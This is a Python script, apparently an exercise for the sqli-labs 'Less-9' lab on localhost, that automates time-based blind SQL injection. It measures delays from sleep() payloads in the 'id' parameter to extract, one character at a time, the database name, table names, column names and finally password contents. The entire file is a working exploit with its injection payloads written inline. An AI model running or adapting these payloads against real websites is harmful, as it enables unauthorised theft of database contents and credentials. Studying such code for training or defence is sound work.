import requests
import time
import datetime
url = "http://127.0.0.1/Less-9/index.php"
p1 = 'abcdefghijklmnopqrstuvwxyz'
#获取数据库长度
def database_len():
    for i in range(1,10):
        payload = "?id=1' and if(length(database())>%s,sleep(4),0)--+"%i
        url1 = url +payload
        #print(url1)
        time1 =datetime.datetime.now()
        r=requests.get(url=url1)
        time2=datetime.datetime.now()
        time3 = (time2-time1).total_seconds()    #计算时间差， 忽略天 只看时分秒   total_seconds() 真正的时间差 包含天
        if time3 >= 4:
            print(i)
        else:
            print(i)
            break
    print('数据库长度为:',i)

#database_len()


#获取数据库名
def datebase_name():
    name=''
    for i in range(1,9):
        for j in p1:
            payload="?id=1' and if(substr(database(),%s,1)='%s',sleep(4),1)--+" %(i,j)
            url1=url+payload
            #print(url1)
            time1=datetime.datetime.now()
            r=requests.get(url=url1)
            time2=datetime.datetime.now()
            time3=(time2-time1).total_seconds()
            if time3 >= 4:
                name += j
                print(name)
                break
    n = name
    print('数据库名字为:'+n)

#datebase_name()

#获取表
def tables_name():
    global table4
    table1=''
    table2=''
    table3=''
    table4=''
    for i in range(5):
        for j in range(1,6):
            for t in p1:
                payload="?id=1' and sleep(if((mid((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)='%s'),3,0)) --+"%(i,j,t)
                url1=url+payload
                #print(url1)
                time1=datetime.datetime.now()
                r=requests.get(url=url1)
                time2=datetime.datetime.now()
                time3=(time2-time1).seconds
                if time3 >= 3:
                    if i == 0:
                        table1 +=t
                        print('第一个表为:',table1)
                    elif i == 1:
                        table2 += t
                        print('第二个表为：',table2)
                    elif i == 2:
                        table3 +=t
                        print('第三个表为：',table3)
                    elif i == 3:
                        table4 += t
                        print('第四个表为：',table4)
                    else:
                        break
    print('第一个表为'+table1)
    print('第二个表为'+table2)
    print('第三个表为' + table3)
    print('第四个表为' + table4)


#tables_name()

#获取表中的字段
def table_column():
    global column3
    column1=''
    column2=''
    column3=''
    f=table4
    for i in range(3):
        for j in range(1,9):
            for t in p1:
                payload="?id=1' and sleep(if((mid((select column_name from information_schema.columns where table_name=\'%s\' limit %s,1),%s,1)='%s'),5,0)) --+"%(f,i,j,t)
                url1 =url+payload
                #print(url1)
                time1 = datetime.datetime.now()
                r = requests.get(url=url1)
                time2 = datetime.datetime.now()
                time3 = (time2 - time1).seconds
                if time3 >= 5:
                    if i == 0:
                        column1 += t
                        print('字段一为：'+column1)
                    elif i == 1:
                        column2 += t
                        print('字段二为：'+column2)
                    elif i == 2:
                        column3 += t
                        print('字段三为:'+column3)
                    else:
                        break
    print('users字段一为：'+column1)
    print('字段二为：'+column2)
    print('字段三为：',column3)


#table_column()

def s_content():
    content1=''
    f1= column3
    f2= table4
    for i in range(20):
            for t in p1:
                payload = "?id=1' and sleep(if((mid((select %s from %s limit 7,1),%s,1)='%s' ),3,0)) --+"%(f1,f2,i,t)
                url1 =url+payload
                #print(url1)
                time1=datetime.datetime.now()
                r = requests.get(url=url1)
                time2 = datetime.datetime.now()
                time3 = (time2-time1).seconds
                if time3 >=3:
                        content1 += t
                        print('password字段一内容为：'+content1)
                        break

    print('字段内容为：'+content1)


start_time=time.time()
database_len()
datebase_name()
tables_name()
table_column()
s_content()
end_time=time.time()
end_start_time=end_time-start_time
print('总花费时间为',end_start_time,'秒')